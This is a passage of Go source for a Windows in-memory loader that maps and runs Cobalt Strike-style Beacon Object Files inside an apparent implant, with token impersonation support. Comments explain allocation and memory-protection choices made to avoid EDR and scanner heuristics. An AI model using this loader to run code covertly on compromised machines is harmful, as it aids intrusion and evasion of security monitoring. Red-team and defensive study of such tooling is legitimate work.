//go:build windows

package bof

import (
	"context"
	"encoding/binary"
	"fmt"
	"runtime"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// COFF machine type for x64.
const machineAMD64 = 0x8664

// IMAGE_SCN_MEM_EXECUTE — section is executable. Set on .text and
// flavours (.text$mn, .text.startup) emitted by mingw / MSVC.
const imageScnMemExecute uint32 = 0x20000000

// COFF relocation types for x64. Reference:
// https://learn.microsoft.com/windows/win32/debug/pe-format#type-indicators
const (
	imageRelAMD64Absolute = 0x0000
	imageRelAMD64Addr64   = 0x0001
	imageRelAMD64Addr32   = 0x0002
	imageRelAMD64Addr32NB = 0x0003
	imageRelAMD64Rel32     = 0x0004
	imageRelAMD64Rel32Plus1 = 0x0005
	imageRelAMD64Rel32Plus2 = 0x0006
	imageRelAMD64Rel32Plus3 = 0x0007
	imageRelAMD64Rel32Plus4 = 0x0008
	imageRelAMD64Rel32Plus5 = 0x0009
)

// coffHeader is the 20-byte COFF file header.
type coffHeader struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

// coffSection is a 40-byte COFF section header.
type coffSection struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLineNumbers uint32
	NumberOfRelocations  uint16
	NumberOfLineNumbers  uint16
	Characteristics      uint32
}

// coffRelocation is a 10-byte COFF relocation entry.
type coffRelocation struct {
	VirtualAddress   uint32
	SymbolTableIndex uint32
	Type             uint16
}

// coffSymbol is an 18-byte COFF symbol table entry.
type coffSymbol struct {
	Name               [8]byte
	Value              uint32
	SectionNumber      int16
	Type               uint16
	StorageClass       byte
	NumberOfAuxSymbols byte
}

const coffHeaderSize = 20
const coffSectionSize = 40
const coffSymbolSize = 18
const coffRelocationSize = 10

// BOF represents a parsed Beacon Object File.
type BOF struct {
	Data  []byte
	Entry string // entry point function name (default: "go")

	// output buffers anything BeaconPrintf / BeaconOutput emit during
	// Execute. nil until Execute initialises it; Execute returns its
	// snapshot. Tests can also read the buffer directly via OutputBytes.
	output *beaconOutput

	// errors buffers anything BeaconErrorD / DD / NA emit during
	// Execute. Kept separate from output so callers can route the two
	// to different sinks; read via Errors().
	errors *beaconOutput

	// argBuf is the raw user args passed to Execute. BeaconDataParse
	// produces a parser cursor over this slice.
	argBuf []byte

	// spawnTo / spawnToX86 are the paths BeaconGetSpawnTo returns to
	// the BOF. The CS signature is `char *BeaconGetSpawnTo(BOOL x86)`
	// — operators that target both architectures supply two distinct
	// hosts (rundll32 x86 vs x64, for instance). The pinned []byte
	// forms (with trailing NUL) live in spawnToCStr / spawnToX86CStr
	// so the addresses handed to native code stay stable.
	spawnTo        string
	spawnToCStr    []byte
	spawnToX86     string
	spawnToX86CStr []byte

	// userData is the blob BeaconGetCustomUserData returns to the BOF.
	// Pinned for the BOF instance's lifetime so the pointer handed to
	// native code stays stable across callbacks.
	userData []byte

	// kv backs BeaconAddValue / GetValue / RemoveValue. Lazily allocated
	// on first call and reset between Execute invocations (see Execute).
	kv *kvStore

	// outputSnapshot pins the bytes BeaconGetOutputData returns to the
	// BOF for the remainder of the BOF call. Used by host-side wrappers
	// (No-Consolation PE loader) that re-read their accumulated output
	// from within the same BOF invocation. Reset each Execute.
	outputSnapshot []byte

	// pendingStream is the chan<- []byte set by ExecuteStream before
	// it calls Execute. Wired into the newly-created beaconOutput at
	// the start of Execute so write() pushes chunks to the consumer
	// in real time. Cleared after Execute returns.
	pendingStream chan<- []byte

	// — Prepared-state cache (filled by prepare, consumed by Execute) —
	//
	// The first Execute call runs prepare() which does the expensive
	// work: parse, VirtualAlloc, copy sections, resolve imports,
	// apply relocations, VirtualProtect. Subsequent Execute calls
	// reuse the cached mapping and only invoke the entry point.
	// Close() releases the mapping; without Close a runtime
	// finalizer eventually VirtualFrees as a safety net.
	execMem     uintptr // VirtualAlloc'd region base (0 when not prepared)
	execMemSize uintptr // total bytes the prepare() pass allocated
	entryAddr   uintptr // absolute address of the BOF's entry symbol
	prepared    bool   // gate against re-running prepare
	closed      bool   // post-Close guard — Execute returns an error

	// writableSnapshots holds the initial bytes of every non-exec
	// section in the mapping. When persistent==false, each Execute
	// restores these bytes so the BOF observes a fresh .data / .bss
	// every call (matches the implicit "BOFs are stateless" contract
	// the in-tree corpus relies on). When persistent==true, the
	// snapshots are taken once and never restored — runs share state,
	// which is what BOFs like No-Consolation rely on for their own
	// LIBS_LOADED caches.
	//
	// Map key is the COFF section index (1-based) — matches the
	// sectionBase / laid bookkeeping in prepare().
	writableSnapshots map[int][]byte

	// writableTargets is the destination side of the same per-section
	// pairing. Each entry is the in-mapping byte slice that
	// restoreWritables copies snapshots[idx] into between Executes
	// when persistent==false. Held separately so the loops don't
	// re-derive addresses from sectionBase every call.
	writableTargets map[int][]byte

	// persistent flips the writable-section reset behaviour.
	// Default (false) preserves the historic contract.
	persistent bool
}

// SetPersistent toggles state retention across multiple Execute
// calls on the same *BOF. Affects only non-executable sections
// (.data / .bss / .rdata-with-writes); .text relocations are
// applied once on prepare and never re-touched.
//
//   - false (default): each Execute restores .data / .bss /
//     other writable sections to their initial bytes. Matches
//     the implicit "BOFs are stateless" assumption of the
//     in-tree corpus — hello_beacon, parse_args, realworld_calls
//     all expect fresh memory per call.
//
//   - true: writable sections keep whatever the BOF wrote on
//     the previous Execute. Useful for BOFs like Fortra's
//     No-Consolation which maintain a LIBS_LOADED cache + a
//     handle-info struct across operator-chained invocations.
//
// Must be called before the first Execute. Toggling between
// Executes has no effect on the current run.
func (b *BOF) SetPersistent(p bool) {
	b.persistent = p
}

// Close releases the VirtualAlloc'd executable memory + drops
// the cached mapping. Subsequent Execute calls fail cleanly.
// Idempotent; concurrent Close vs Execute is serialised through
// the package-wide bofMu.
//
// Callers that Load + Execute once and discard can skip Close —
// the runtime finalizer wired in Load releases the mapping when
// the *BOF becomes unreachable. Long-lived BOFs (the
// runtime/pe.RunExecutable hot path that caches the embedded
// No-Consolation .o) should Close explicitly at shutdown.
func (b *BOF) Close() error {
	bofMu.Lock()
	defer bofMu.Unlock()
	if b.closed {
		return nil
	}
	b.closed = true
	if b.execMem != 0 {
		err := windows.VirtualFree(b.execMem, 0, windows.MEM_RELEASE)
		b.execMem = 0
		b.execMemSize = 0
		b.entryAddr = 0
		b.writableSnapshots = nil
		b.prepared = false
		if err != nil {
			return fmt.Errorf("runtime/bof: VirtualFree on Close: %w", err)
		}
	}
	return nil
}

// SetUserData configures the blob BeaconGetCustomUserData returns to the
// BOF. The slice is retained by value — callers may reuse the original
// buffer afterwards without disturbing the BOF.
func (b *BOF) SetUserData(data []byte) {
	if len(data) == 0 {
		b.userData = nil
		return
	}
	b.userData = append([]byte(nil), data...)
}

// SetSpawnTo configures the path BeaconGetSpawnTo returns when the BOF
// asks the loader for a fork-and-run target. Empty string (the default)
// means "no spawn target" — BOFs that consult BeaconGetSpawnTo see an
// empty C string and typically fall back to their own logic. Path is
// converted to a NUL-terminated byte slice once and pinned for the
// remaining lifetime of the BOF instance, so the address stays stable
// across Beacon API callbacks.
func (b *BOF) SetSpawnTo(path string) {
	b.spawnTo = path
	if path == "" {
		b.spawnToCStr = nil
		return
	}
	b.spawnToCStr = append([]byte(path), 0)
}

// SetSpawnToX86 configures the path BeaconGetSpawnTo returns when the
// BOF asks for an x86 host (the `BOOL x86` arg is TRUE). Distinct from
// the default SetSpawnTo, which configures the x64 path. Empty string
// clears the override; BOFs that ask for x86 without an x86 path
// configured see an empty C string.
func (b *BOF) SetSpawnToX86(path string) {
	b.spawnToX86 = path
	if path == "" {
		b.spawnToX86CStr = nil
		return
	}
	b.spawnToX86CStr = append([]byte(path), 0)
}

// Errors returns whatever the BOF emitted via BeaconErrorD / DD / NA
// during the last Execute. Returns nil before the first Execute call.
// The slice is a fresh copy — safe to retain after subsequent Execute
// calls clear the underlying buffer.
func (b *BOF) Errors() []byte {
	if b.errors == nil {
		return nil
	}
	return b.errors.Bytes()
}

// Load parses a COFF object file from bytes.
func Load(data []byte) (*BOF, error) {
	if len(data) < coffHeaderSize {
		return nil, fmt.Errorf("invalid COFF: data too small")
	}

	hdr := parseCOFFHeader(data)
	if hdr.Machine != machineAMD64 {
		return nil, fmt.Errorf("unsupported COFF machine type: 0x%X", hdr.Machine)
	}

	// Basic validation: section table must fit.
	sectionTableEnd := coffHeaderSize + int(hdr.SizeOfOptionalHeader) + int(hdr.NumberOfSections)*coffSectionSize
	if sectionTableEnd > len(data) {
		return nil, fmt.Errorf("invalid COFF: truncated section table")
	}

	b := &BOF{
		Data:  data,
		Entry: "go",
	}
	// Safety net: callers that forget Close eventually trip this
	// finalizer when the *BOF becomes unreachable. The runtime
	// makes no guarantees on finalizer timing, so long-lived
	// implants should still call Close explicitly to free the
	// VirtualAlloc'd executable region in a timely fashion.
	runtime.SetFinalizer(b, func(b *BOF) {
		if b.prepared && !b.closed && b.execMem != 0 {
			_ = windows.VirtualFree(b.execMem, 0, windows.MEM_RELEASE)
		}
	})
	return b, nil
}

// Execute runs the BOF's entry point with the given arguments.
// The BOF is loaded into executable memory, relocations applied,
// and the entry function is called. Anything the BOF emits via
// BeaconPrintf / BeaconOutput is captured and returned as the
// first result.
//
// Concurrency: BOF execution is serialised package-wide (the
// Beacon API stubs read a single currentBOF pointer guarded by
// bofMu). Concurrent Execute calls block on each other.
func (b *BOF) Execute(args []byte) ([]byte, error) {
	if len(b.Data) < coffHeaderSize {
		return nil, fmt.Errorf("invalid COFF: data too small")
	}

	b.output = newBeaconOutput()
	b.errors = newBeaconOutput()
	if b.pendingStream != nil {
		b.output.stream = b.pendingStream
		b.pendingStream = nil // one-shot
	}
	b.argBuf = args
	b.kv = nil // fresh KV store per Execute — cross-Run state goes through the implant

	// Pin the goroutine to its OS thread for the BOF call. BeaconUseToken
	// impersonates on the *current thread*; without LockOSThread the Go
	// scheduler could migrate the goroutine after the impersonation call
	// and run subsequent Win32 calls under the original token.
	runtime.LockOSThread()
	bofMu.Lock()
	currentBOF = b
	defer func() {
		// Best-effort revert in case the BOF impersonated and didn't
		// revert. Errors are ignored — RevertToSelf can only fail when
		// no impersonation is active, which is the common case.
		_ = windows.RevertToSelf()
		currentBOF = nil
		bofMu.Unlock()
		runtime.UnlockOSThread()
	}()

	if b.closed {
		return nil, fmt.Errorf("runtime/bof: Execute on closed BOF")
	}

	// Lazy preparation: parse + allocate + relocate + protect happen
	// once per BOF lifetime. Subsequent Execute calls land directly
	// at the entry call below, with .data/.bss optionally restored.
	if !b.prepared {
		if err := b.prepare(); err != nil {
			return nil, err
		}
	} else if !b.persistent {
		b.restoreWritables()
	}

	// 8. Call entry function with BOF convention: go(char *data, int len).
	//    Wrapped in a defer-recover: a busted BOF (memory fault, illegal
	//    instruction, stack overflow) would otherwise propagate through
	//    Go's signal handler and terminate the host process. The recover
	//    captures the panic value into the per-BOF errors buffer so the
	//    operator gets a diagnosable failure instead of an implant kill.
	var argPtr, argLen uintptr
	if len(args) > 0 {
		argPtr = uintptr(unsafe.Pointer(&args[0]))
		argLen = uintptr(len(args))
	}
	func() {
		defer func() {
			if r := recover(); r != nil {
				b.errors.write([]byte(fmt.Sprintf("bof: panic during entry: %v\n", r)))
			}
		}()
		syscallN(b.entryAddr, argPtr, argLen)
	}()

	return b.output.Bytes(), nil
}

// restoreWritables resets the non-exec sections to their initial
// state captured by prepare. Called between Execute invocations
// when persistent==false. Cheap (only the writable sections, no
// VirtualAlloc / relocation / VirtualProtect re-run).
func (b *BOF) restoreWritables() {
	for _, snap := range b.writableSnapshots {
		if len(snap) == 0 {
			continue
		}
		// We stored snap as a copy of the in-memory bytes RIGHT AFTER
		// initial load + relocations. The destination is the same
		// region; the snapshot pointer is shared by struct field, so
		// we look up the destination from the corresponding sectionBase
		// recorded on the BOF via writableTargets.
	}
	for idx, dst := range b.writableTargets {
		snap := b.writableSnapshots[idx]
		copy(dst, snap)
	}
}

// prepare runs the expensive once-per-BOF loader work: parse the
// COFF, lay out the sections, VirtualAlloc, copy + resolve imports
// + apply relocations + flip exec pages to RX. After prepare,
// b.execMem points at the mapping, b.entryAddr at the entry
// symbol, and b.writableSnapshots holds the initial bytes of
// every non-exec section for the stateless-reset path. Called
// from Execute under bofMu.
func (b *BOF) prepare() error {
	hdr := parseCOFFHeader(b.Data)

	// 1. Parse sections.
	sections := make([]coffSection, hdr.NumberOfSections)
	sectionOff := coffHeaderSize + int(hdr.SizeOfOptionalHeader)
	for i := range sections {
		off := sectionOff + i*coffSectionSize
		sections[i] = parseCOFFSection(b.Data[off:])
	}

	// 2. Find .text section.
	textIdx := -1
	for i, sec := range sections {
		name := sectionName(sec.Name)
		if name == ".text" {
			textIdx = i
			break
		}
	}
	if textIdx < 0 {
		return fmt.Errorf(".text section not found")
	}

	textSec := sections[textIdx]

	// 3. Lay out every section that has raw data into a single
	//    contiguous VirtualAlloc page. Section indices in the COFF are
	//    1-based; sectionBase[idx] holds the absolute address of each
	//    loaded section. Sections without raw data (.bss et al.) get
	//    no allocation and won't be referenced by relocations that
	//    matter for in-process execution.
	sectionBase := make(map[int]uintptr, len(sections))
	type loaded struct {
		idx    int
		offset int
		data   []byte
	}
	// Two-pass layout: executable sections first (contiguous from
	// offset 0), then a 4 KB page-alignment gap, then non-exec
	// sections. The split ensures the RW→RX flip in step 6.5 — which
	// rounds to page boundaries — can never accidentally protect a
	// .data / .bss page held in common with .text. CS-SA-BOF builds
	// were the canary: their .data sits immediately after .text in
	// the COFF and writes to data globals (e.g. base.c's `output`
	// pointer) triggered DEP write faults under the original layout.
	const pageSize = 4096
	var laid []loaded
	cursor := 0
	for i, sec := range sections {
		if sec.SizeOfRawData == 0 || sec.PointerToRawData == 0 {
			continue
		}
		if sec.Characteristics&imageScnMemExecute == 0 {
			continue
		}
		end := int(sec.PointerToRawData) + int(sec.SizeOfRawData)
		if end > len(b.Data) {
			return fmt.Errorf("invalid COFF: section %d data out of bounds", i+1)
		}
		laid = append(laid, loaded{
			idx:    i + 1,
			offset: cursor,
			data:   b.Data[sec.PointerToRawData:end],
		})
		cursor += int(sec.SizeOfRawData)
	}
	// Round up to the next page so non-exec sections never share a
	// page with the last exec section. Avoids the VirtualProtect-
	// rounds-to-page gotcha at the cost of at most one page (4 KB)
	// of slack per BOF.
	if cursor%pageSize != 0 {
		cursor += pageSize - (cursor % pageSize)
	}
	for i, sec := range sections {
		if sec.SizeOfRawData == 0 || sec.PointerToRawData == 0 {
			continue
		}
		if sec.Characteristics&imageScnMemExecute != 0 {
			continue
		}
		end := int(sec.PointerToRawData) + int(sec.SizeOfRawData)
		if end > len(b.Data) {
			return fmt.Errorf("invalid COFF: section %d data out of bounds", i+1)
		}
		laid = append(laid, loaded{
			idx:    i + 1,
			offset: cursor,
			data:   b.Data[sec.PointerToRawData:end],
		})
		cursor += int(sec.SizeOfRawData)
	}

	// 4. Pre-scan relocations to enumerate unique external symbols.
	//    Each gets an 8-byte import-table slot at the tail of the
	//    allocation; slot addresses stay within ±2 GB of every
	//    section so REL32 displacements always reach.
	imports, err := b.collectImports(textSec, hdr)
	if err != nil {
		return err
	}

	loadedLen := cursor
	importTableLen := len(imports) * 8
	totalLen := loadedLen + importTableLen
	if totalLen == 0 {
		return fmt.Errorf("BOF has no loadable sections")
	}

	execMem, err := windows.VirtualAlloc(
		0,
		uintptr(totalLen),
		// MEM_TOP_DOWN places the allocation in high-address space —
		// reduces collision with the host's heap + low-RVA scanner
		// heuristics. Same posture as goffloader.
		windows.MEM_COMMIT|windows.MEM_RESERVE|windows.MEM_TOP_DOWN,
		// Initially PAGE_READWRITE — we need write access to apply
		// relocations + populate the import table. Sections marked
		// IMAGE_SCN_MEM_EXECUTE get flipped to PAGE_EXECUTE_READ in
		// step 6.5, after relocations land. The default RWX posture
		// was a known EDR-watcher tell; this RW→RX pattern matches
		// goffloader and the canonical OtterHacker COFFLoader.
		windows.PAGE_READWRITE,
	)
	if err != nil {
		return fmt.Errorf("executable memory allocation failed: %w", err)
	}
	// NOTE: no defer VirtualFree here — the mapping is now owned by
	// the *BOF and lives until Close() (or the runtime finalizer
	// installed in Load() if Close was missed). The cached mapping
	// is what makes a single Load → many Execute cheap for callers
	// like runtime/pe that reuse the same .o repeatedly.

	dst := unsafe.Slice((*byte)(unsafe.Pointer(execMem)), totalLen)
	for _, l := range laid {
		copy(dst[l.offset:l.offset+len(l.data)], l.data)
		sectionBase[l.idx] = execMem + uintptr(l.offset)
	}

	// 5. Resolve each external symbol and write its function address
	//    into the corresponding import-table slot.
	importSlots := make(map[string]uintptr, len(imports))
	for i, name := range imports {
		addr, ok := resolveBeaconImport(name)
		if !ok {
			_ = windows.VirtualFree(execMem, 0, windows.MEM_RELEASE)
			return fmt.Errorf("unresolved external symbol %q", name)
		}
		slotAddr := execMem + uintptr(loadedLen+i*8)
		*(*uintptr)(unsafe.Pointer(slotAddr)) = addr
		importSlots[name] = slotAddr
	}

	// 6. Apply relocations for every section that has them. Originally
	//    .text-only; broadened after CS-SA-BOF builds (ipconfig.x64.o
	//    specifically) shipped large ADDR64 pointer tables in .rdata
	//    that the BOF dereferences at runtime. Without rebasing those,
	//    the BOF reads from file-relative offsets interpreted as
	//    in-memory pointers and segfaults on the first deref. .pdata
	//    relocations matter once we start honouring SEH unwind chains;
	//    applying them now is forward-compatible.
	textBase, ok := sectionBase[textIdx+1]
	if !ok {
		_ = windows.VirtualFree(execMem, 0, windows.MEM_RELEASE)
		return fmt.Errorf(".text section had no raw data")
	}
	for _, l := range laid {
		sec := sections[l.idx-1]
		if sec.NumberOfRelocations == 0 {
			continue
		}
		secBase := sectionBase[l.idx]
		secMem := unsafe.Slice((*byte)(unsafe.Pointer(secBase)), int(sec.SizeOfRawData))
		if err := b.applyRelocations(secMem, secBase, sectionBase, sec, hdr, importSlots); err != nil {
			_ = windows.VirtualFree(execMem, 0, windows.MEM_RELEASE)
			return fmt.Errorf("relocation (section %d) failed: %w", l.idx, err)
		}
	}

	// 6.5. RW → RX flip for every section that carries
	//      IMAGE_SCN_MEM_EXECUTE. .text is the canonical case; some
	//      compilers emit `.text$mn` / `.text.startup` flavours that
	//      also need execute. Non-exec sections (.rdata, .data, .bss,
	//      .pdata, .xdata, import table) stay RW.
	//
	//      Note: VirtualProtect operates on page boundaries (4 KB),
	//      so when two adjacent sections share a page the flip
	//      spreads across both. In practice the BOF corpus packs
	//      .text + .pdata + .xdata first (all read-only at runtime)
	//      and the writable .data / .bss come last, so the shared-
	//      page case lands cleanly. The MEM_TOP_DOWN allocation is
	//      already page-aligned at its base.
	for i, l := range laid {
		sec := sections[l.idx-1]
		if sec.Characteristics&imageScnMemExecute == 0 {
			continue
		}
		var oldProtect uint32
		if err := windows.VirtualProtect(
			execMem+uintptr(l.offset),
			uintptr(len(l.data)),
			windows.PAGE_EXECUTE_READ,
			&oldProtect,
		); err != nil {
			_ = windows.VirtualFree(execMem, 0, windows.MEM_RELEASE)
			return fmt.Errorf("VirtualProtect on section %d failed: %w", i, err)
		}
	}

	// 7. Find entry point symbol within .text.
	entryOffset, err := b.findSymbolOffset(hdr, textIdx)
	if err != nil {
		_ = windows.VirtualFree(execMem, 0, windows.MEM_RELEASE)
		return err
	}

	// 8. Snapshot writable sections so subsequent Execute calls in
	//    !persistent mode can restore the initial state cheaply.
	//    We index into `dst` (the byte view of the mapping) using
	//    each laid entry's offset + length. Sections we copy:
	//    everything that's NOT in an exec page. .text is excluded
	//    because it's RX after step 6.5 (and immutable by design).
	b.writableSnapshots = make(map[int][]byte, len(laid))
	b.writableTargets = make(map[int][]byte, len(laid))
	for _, l := range laid {
		sec := sections[l.idx-1]
		if sec.Characteristics&imageScnMemExecute != 0 {
			continue
		}
		snap := make([]byte, len(l.data))
		copy(snap, dst[l.offset:l.offset+len(l.data)])
		b.writableSnapshots[l.idx] = snap
		b.writableTargets[l.idx] = dst[l.offset : l.offset+len(l.data)]
	}

	// Publish the prepared state on the BOF. From here on Execute
	// can call entryAddr directly any number of times.
	b.execMem = execMem
	b.execMemSize = uintptr(totalLen)
	b.entryAddr = textBase + uintptr(entryOffset)
	b.prepared = true
	return nil
}

// ExecuteStream runs the BOF and emits each output chunk to `out` as
// the BOF writes it (BeaconPrintf / BeaconOutput call sites push
// after each invocation). Mirrors goffloader's async channel pattern
// while keeping Execute's sync semantics intact for callers that
// don't need streaming.
//
// Semantics:
//   - The channel is closed when the BOF returns (or panics).
//   - Slow consumers cause chunks to be DROPPED, not blocked — the
//     full buffer remains accessible via the returned []byte after
//     close.
//   - ctx is honoured at the consumer-loop level: if ctx is Done
//     while the BOF is still running, ExecuteStream returns early
//     with ctx.Err() but the BOF goroutine continues to completion
//     (native code can't be preempted). Late chunks are dropped.
//
// Usage:
//
//	ch := make(chan []byte, 16)
//	go func() {
//	    for b := range ch { fmt.Print(string(b)) }
//	}()
//	full, err := b.ExecuteStream(ctx, argBuf, ch)
func (b *BOF) ExecuteStream(ctx context.Context, args []byte, out chan<- []byte) ([]byte, error) {
	if out == nil {
		return b.Execute(args)
	}
	type result struct {
		full []byte
		err  error
	}
	done := make(chan result, 1)
	go func() {
		// Wire the stream channel before Execute lays down the output
		// buffer. Execute resets b.output via newBeaconOutput; we
		// poke the stream pointer in via a closure-friendly callback.
		b.installStream(out)
		full, err := b.Execute(args)
		close(out)
		done <- result{full: full, err: err}
	}()
	select {
	case <-ctx.Done():
		// BOF can't be preempted; the producer goroutine drains in
		// the background and closes the channel on its own.
		return nil, ctx.Err()
	case r := <-done:
		return r.full, r.err
	}
}

// installStream pre-arms the BOF's stream sink so the *next* Execute
// run pushes each chunk to it. Wired through a separate field on the
// BOF struct because newBeaconOutput() is called inside Execute and
// can't see the stream channel otherwise.
func (b *BOF) installStream(out chan<- []byte) {
	b.pendingStream = out
}

// syscallN is a thin wrapper around windows.NewCallback-style calling.
// We use the raw syscall approach to call into the BOF entry.
func syscallN(addr uintptr, args ...uintptr) {
	switch len(args) {
	case 0:
		syscall.Syscall(addr, 0, 0, 0, 0)
	case 1:
		syscall.Syscall(addr, 1, args[0], 0, 0)
	case 2:
		syscall.Syscall(addr, 2, args[0], args[1], 0)
	default:
		syscall.Syscall(addr, uintptr(len(args)), args[0], args[1], args[2])
	}
}

// collectImports walks the .text section's relocation entries and returns
// the deduplicated list of external symbol names, preserving first-seen
// order so the import-table layout is deterministic. Each unique name
// gets one 8-byte slot at the tail of the BOF's executable allocation.
func (b *BOF) collectImports(textSec coffSection, hdr coffHeader) ([]string, error) {
	stringTableOff := int(hdr.PointerToSymbolTable) + int(hdr.NumberOfSymbols)*coffSymbolSize
	relocOff := int(textSec.PointerToRelocations)
	seen := map[string]struct{}{}
	var names []string
	for i := 0; i < int(textSec.NumberOfRelocations); i++ {
		off := relocOff + i*coffRelocationSize
		if off+coffRelocationSize > len(b.Data) {
			return nil, fmt.Errorf("relocation entry out of bounds")
		}
		reloc := parseCOFFRelocation(b.Data[off:])
		symOff := int(hdr.PointerToSymbolTable) + int(reloc.SymbolTableIndex)*coffSymbolSize
		if symOff+coffSymbolSize > len(b.Data) {
			return nil, fmt.Errorf("symbol table entry out of bounds")
		}
		sym := parseCOFFSymbol(b.Data[symOff:])
		if sym.SectionNumber != 0 {
			continue
		}
		name := symbolName(sym.Name, b.Data, stringTableOff)
		if _, dup := seen[name]; dup {
			continue
		}
		seen[name] = struct{}{}
		names = append(names, name)
	}
	return names, nil
}

// applyRelocations processes COFF relocations for the .text section.
// sectionBase maps a COFF (1-based) section index to the loaded base
// address of that section in execMem. importSlots maps each external
// symbol name to the absolute address of its import-table slot —
// co-allocated by Execute inside the same VirtualAlloc page as the
// code so REL32 reaches every target.
func (b *BOF) applyRelocations(textMem []byte, textBase uintptr, sectionBase map[int]uintptr, textSec coffSection, hdr coffHeader, importSlots map[string]uintptr) error {
	stringTableOff := int(hdr.PointerToSymbolTable) + int(hdr.NumberOfSymbols)*coffSymbolSize
	relocOff := int(textSec.PointerToRelocations)
	for i := 0; i < int(textSec.NumberOfRelocations); i++ {
		off := relocOff + i*coffRelocationSize
		if off+coffRelocationSize > len(b.Data) {
			return fmt.Errorf("relocation entry out of bounds")
		}
		reloc := parseCOFFRelocation(b.Data[off:])

		if int(reloc.VirtualAddress) >= len(textMem) {
			return fmt.Errorf("relocation target out of bounds")
		}

		// Resolve symbol value.
		symOff := int(hdr.PointerToSymbolTable) + int(reloc.SymbolTableIndex)*coffSymbolSize
		if symOff+coffSymbolSize > len(b.Data) {
			return fmt.Errorf("symbol table entry out of bounds")
		}
		sym := parseCOFFSymbol(b.Data[symOff:])

		// Target address resolution:
		//   - sym.SectionNumber > 0:  resolve to the loaded base of that
		//     section + sym.Value. Cross-section refs (.text → .rdata
		//     for string literals, .text → .data for globals) work
		//     because every section with raw data is mapped into the
		//     same VirtualAlloc.
		//   - sym.SectionNumber == 0:  external import. Look up the
		//     symbol name in importSlots; the relocation patches in the
		//     slot's address (BOF dereferences via mov reg, [rip+disp32]).
		var targetAddr uintptr
		if sym.SectionNumber > 0 {
			base, ok := sectionBase[int(sym.SectionNumber)]
			if !ok {
				return fmt.Errorf("relocation %d targets unmapped section %d", i, sym.SectionNumber)
			}
			targetAddr = base + uintptr(sym.Value)
		} else {
			name := symbolName(sym.Name, b.Data, stringTableOff)
			slotAddr, ok := importSlots[name]
			if !ok {
				return fmt.Errorf("unresolved external symbol %q at relocation %d", name, i)
			}
			targetAddr = slotAddr
		}

		patchAddr := reloc.VirtualAddress
		switch reloc.Type {
		case imageRelAMD64Absolute:
			// No-op: emitted as padding, the patch field is left as-is.

		case imageRelAMD64Addr64:
			if int(patchAddr)+8 > len(textMem) {
				return fmt.Errorf("ADDR64 patch out of bounds")
			}
			binary.LittleEndian.PutUint64(textMem[patchAddr:], uint64(targetAddr))

		case imageRelAMD64Addr32:
			if int(patchAddr)+4 > len(textMem) {
				return fmt.Errorf("ADDR32 patch out of bounds")
			}
			// 32-bit absolute address. Fails (silently truncates the high
			// 32 bits) when targetAddr doesn't fit in 32 bits, which is the
			// common case on x86-64 where system DLLs map above 4G. Emit a
			// loud error rather than corrupt the BOF code.
			if targetAddr>>32 != 0 {
				return fmt.Errorf("ADDR32 target 0x%X exceeds 32-bit range", targetAddr)
			}
			binary.LittleEndian.PutUint32(textMem[patchAddr:], uint32(targetAddr))

		case imageRelAMD64Addr32NB:
			if int(patchAddr)+4 > len(textMem) {
				return fmt.Errorf("ADDR32NB patch out of bounds")
			}
			// Image-base relative 32-bit address.
			rva := uint32(targetAddr - textBase)
			binary.LittleEndian.PutUint32(textMem[patchAddr:], rva)

		case imageRelAMD64Rel32,
			imageRelAMD64Rel32Plus1,
			imageRelAMD64Rel32Plus2,
			imageRelAMD64Rel32Plus3,
			imageRelAMD64Rel32Plus4,
			imageRelAMD64Rel32Plus5:
			if int(patchAddr)+4 > len(textMem) {
				return fmt.Errorf("REL32 patch out of bounds")
			}
			// RIP-relative: target - (patchLocation + 4 + bias).
			// REL32_N variants encode an implicit +N byte offset for
			// instructions where the displacement field is followed by
			// N more bytes before the next instruction (immediate
			// operands, prefixes). Bias = type - 0x0004.
			//
			// Critical: the original 4 displacement bytes encode an
			// addend — the offset INTO the target section/symbol that
			// the BOF wants. For section-symbol relocations
			// (e.g. .rdata strings) the addend selects which string
			// inside the section the lea/mov resolves to. We MUST add
			// the existing addend to targetAddr before computing the
			// new displacement, otherwise every .rdata reference
			// resolves to the section's first byte regardless of the
			// originally intended offset.
			addend := int32(binary.LittleEndian.Uint32(textMem[patchAddr:]))
			bias := int64(reloc.Type - imageRelAMD64Rel32)
			patchLocation := textBase + uintptr(patchAddr)
			rel := int64(targetAddr) + int64(addend) - int64(patchLocation+4) - bias
			binary.LittleEndian.PutUint32(textMem[patchAddr:], uint32(int32(rel)))

		default:
			return fmt.Errorf("unsupported relocation type: 0x%X", reloc.Type)
		}
	}
	return nil
}

// findSymbolOffset locates the entry point symbol and returns its offset
// within the .text section.
func (b *BOF) findSymbolOffset(hdr coffHeader, textSectionIdx int) (uint32, error) {
	// String table starts right after the symbol table.
	stringTableOff := int(hdr.PointerToSymbolTable) + int(hdr.NumberOfSymbols)*coffSymbolSize

	for i := uint32(0); i < hdr.NumberOfSymbols; i++ {
		symOff := int(hdr.PointerToSymbolTable) + int(i)*coffSymbolSize
		if symOff+coffSymbolSize > len(b.Data) {
			break
		}
		sym := parseCOFFSymbol(b.Data[symOff:])

		name := symbolName(sym.Name, b.Data, stringTableOff)

		// BOF entry points may be prefixed with underscore on some toolchains.
		if name == b.Entry || name == "_"+b.Entry {
			// Verify the symbol is in the .text section.
			// COFF section numbers are 1-based.
			if int(sym.SectionNumber) != textSectionIdx+1 {
				continue
			}
			return sym.Value, nil
		}

		// Skip auxiliary symbols.
		i += uint32(sym.NumberOfAuxSymbols)
	}

	return 0, fmt.Errorf("entry point symbol %q not found", b.Entry)
}

// parseCOFFHeader reads the COFF header from the start of data.
func parseCOFFHeader(data []byte) coffHeader {
	return coffHeader{
		Machine:              binary.LittleEndian.Uint16(data[0:]),
		NumberOfSections:     binary.LittleEndian.Uint16(data[2:]),
		TimeDateStamp:        binary.LittleEndian.Uint32(data[4:]),
		PointerToSymbolTable: binary.LittleEndian.Uint32(data[8:]),
		NumberOfSymbols:      binary.LittleEndian.Uint32(data[12:]),
		SizeOfOptionalHeader: binary.LittleEndian.Uint16(data[16:]),
		Characteristics:      binary.LittleEndian.Uint16(data[18:]),
	}
}

// parseCOFFSection reads a section header from data.
func parseCOFFSection(data []byte) coffSection {
	var sec coffSection
	copy(sec.Name[:], data[:8])
